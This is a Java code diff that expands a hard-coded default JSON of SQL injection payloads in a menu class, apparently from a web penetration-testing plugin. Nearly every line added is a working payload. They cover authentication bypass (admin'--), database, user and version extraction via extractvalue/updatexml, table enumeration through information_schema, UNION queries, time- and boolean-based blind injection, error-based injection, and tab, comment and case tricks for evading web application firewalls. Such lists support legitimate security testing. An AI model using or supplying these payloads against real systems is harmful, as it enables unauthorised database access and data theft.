@@ -285,16 +285,130 @@ public class CustomStatement_Menu extends JMenu{
      */
     private void createDefaultJsonFile() {
         try {
-            // 复制已创建的JSON文件内容
+            // 完整的默认JSON配置内容
             String defaultContent = "{\n" +
                 "  \"categories\": {\n" +
                 "    \"基础注入测试\": {\n" +
                 "      \"description\": \"基本的SQL注入测试payload\",\n" +
                 "      \"payloads\": [\n" +
-                "        { \"name\": \"单引号测试\", \"payload\": \"'\" },\n" +
-                "        { \"name\": \"经典OR注入\", \"payload\": \"' OR '1'='1\" },\n" +
-                "        { \"name\": \"数字OR注入\", \"payload\": \"' OR 1=1--\" },\n" +
-                "        { \"name\": \"管理员绕过\", \"payload\": \"admin'--\" }\n" +
+                "        {\n" +
+                "          \"name\": \"单引号测试\",\n" +
+                "          \"payload\": \"'\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"经典OR注入\",\n" +
+                "          \"payload\": \"' OR '1'='1\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"数字OR注入\",\n" +
+                "          \"payload\": \"' OR 1=1--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"管理员绕过\",\n" +
+                "          \"payload\": \"admin'--\"\n" +
+                "        }\n" +
+                "      ]\n" +
+                "    },\n" +
+                "    \"数据库信息获取\": {\n" +
+                "      \"description\": \"获取数据库基本信息的payload\",\n" +
+                "      \"payloads\": [\n" +
+                "        {\n" +
+                "          \"name\": \"获取数据库名(extractvalue)\",\n" +
+                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"获取数据库名(updatexml)\",\n" +
+                "          \"payload\": \"'%09AND%09updatexml(1,concat(0x7e,database(),0x7e),1)--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"获取用户信息\",\n" +
+                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,user(),0x7e))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"获取版本信息\",\n" +
+                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,version(),0x7e))--\"\n" +
+                "        }\n" +
+                "      ]\n" +
+                "    },\n" +
+                "    \"表结构枚举\": {\n" +
+                "      \"description\": \"枚举数据库表和列信息\",\n" +
+                "      \"payloads\": [\n" +
+                "        {\n" +
+                "          \"name\": \"获取表名列表(extractvalue)\",\n" +
+                "          \"payload\": \"'%09AND%09extractvalue(1,concat(0x7e,(SELECT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),0x7e))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"获取表名列表(updatexml)\",\n" +
+                "          \"payload\": \"'%09AND%09updatexml(1,concat(0x7e,(SELECT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),0x7e),1)--\"\n" +
+                "        }\n" +
+                "      ]\n" +
+                "    },\n" +
+                "    \"联合注入\": {\n" +
+                "      \"description\": \"Union-based SQL注入payload\",\n" +
+                "      \"payloads\": [\n" +
+                "        {\n" +
+                "          \"name\": \"Union获取数据库名\",\n" +
+                "          \"payload\": \"'%09UNION%09SELECT%091,2,database()--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"Union获取表名\",\n" +
+                "          \"payload\": \"'%09UNION%09SELECT%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()--\"\n" +
+                "        }\n" +
+                "      ]\n" +
+                "    },\n" +
+                "    \"盲注测试\": {\n" +
+                "      \"description\": \"时间盲注和布尔盲注payload\",\n" +
+                "      \"payloads\": [\n" +
+                "        {\n" +
+                "          \"name\": \"时间延迟测试\",\n" +
+                "          \"payload\": \"'%09AND%09sleep(5)--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"条件时间盲注\",\n" +
+                "          \"payload\": \"'%09AND%09if(length(database())>5,sleep(5),1)--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"布尔盲注-长度测试\",\n" +
+                "          \"payload\": \"'%09AND%09length(database())>5--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"布尔盲注-字符测试\",\n" +
+                "          \"payload\": \"'%09AND%09ascii(substr(database(),1,1))>97--\"\n" +
+                "        }\n" +
+                "      ]\n" +
+                "    },\n" +
+                "    \"错误注入\": {\n" +
+                "      \"description\": \"基于错误的SQL注入方法\",\n" +
+                "      \"payloads\": [\n" +
+                "        {\n" +
+                "          \"name\": \"EXP函数错误注入\",\n" +
+                "          \"payload\": \"'%09AND%09exp(~(select%09*%09from(select%09database())a))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"GTID函数错误注入\",\n" +
+                "          \"payload\": \"'%09AND%09gtid_subset(database(),1)--\"\n" +
+                "        }\n" +
+                "      ]\n" +
+                "    },\n" +
+                "    \"WAF绕过\": {\n" +
+                "      \"description\": \"绕过Web应用防火墙的技巧\",\n" +
+                "      \"payloads\": [\n" +
+                "        {\n" +
+                "          \"name\": \"注释绕过\",\n" +
+                "          \"payload\": \"'/**/AND/**/extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"大小写绕过\",\n" +
+                "          \"payload\": \"'%09AnD%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"版本注释绕过\",\n" +
+                "          \"payload\": \"'%09/*!50000AND*/%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
+                "        },\n" +
+                "        {\n" +
+                "          \"name\": \"AND符号绕过\",\n" +
+                "          \"payload\": \"'%09%26%26%09extractvalue(1,concat(0x7e,database(),0x7e))--\"\n" +
+                "        }\n" +
                 "      ]\n" +
                 "    }\n" +
                 "  }\n" +
